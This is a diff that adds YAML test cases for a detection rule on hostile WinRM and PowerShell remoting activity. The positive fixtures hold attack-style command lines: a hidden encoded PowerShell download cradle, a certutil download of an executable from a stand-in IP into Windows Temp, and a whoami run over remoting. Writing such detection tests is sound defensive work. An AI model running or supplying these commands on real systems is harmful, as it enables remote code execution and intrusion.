@@ -1,0 +1,45 @@
+rule: TH-007-winrm-powershell-remoting
+description: >
+  Positives cover the two remoting host parents with an encoded payload and a transfer utility. The
+  negatives are the two cases that matter: benign inventory over WinRM, and the same encoded command
+  under a normal interactive parent, which is TH-009 territory and must not fire here.
+cases:
+  - name: Encoded PowerShell under wsmprovhost
+    expect: match
+    event:
+      Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
+      CommandLine: 'powershell.exe -NoP -NonI -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA'
+      ParentImage: 'C:\Windows\System32\wsmprovhost.exe'
+      User: 'CONTOSO\adm-jdoe'
+
+  - name: certutil download under winrshost
+    expect: match
+    event:
+      Image: 'C:\Windows\System32\certutil.exe'
+      CommandLine: 'certutil.exe -urlcache -split -f http://198.51.100.20/a.exe C:\Windows\Temp\a.exe'
+      ParentImage: 'C:\Windows\System32\winrshost.exe'
+      User: 'CONTOSO\svc-app'
+
+  - name: cmd.exe under wsmprovhost with no payload markers
+    expect: match
+    event:
+      Image: 'C:\Windows\System32\cmd.exe'
+      CommandLine: 'cmd.exe /c whoami'
+      ParentImage: 'C:\Windows\System32\wsmprovhost.exe'
+      User: 'CONTOSO\adm-jdoe'
+
+  - name: Inventory binary under WinRM that is neither interpreter nor transfer tool
+    expect: no_match
+    event:
+      Image: 'C:\Program Files\Contoso\Inventory\collect.exe'
+      CommandLine: 'collect.exe --report hardware'
+      ParentImage: 'C:\Windows\System32\wsmprovhost.exe'
+      User: 'CONTOSO\svc-inventory'
+
+  - name: Encoded PowerShell under an interactive parent belongs to TH-009
+    expect: no_match
+    event:
+      Image: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
+      CommandLine: 'powershell.exe -NoP -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA'
+      ParentImage: 'C:\Windows\explorer.exe'
+      User: 'CONTOSO\jdoe'
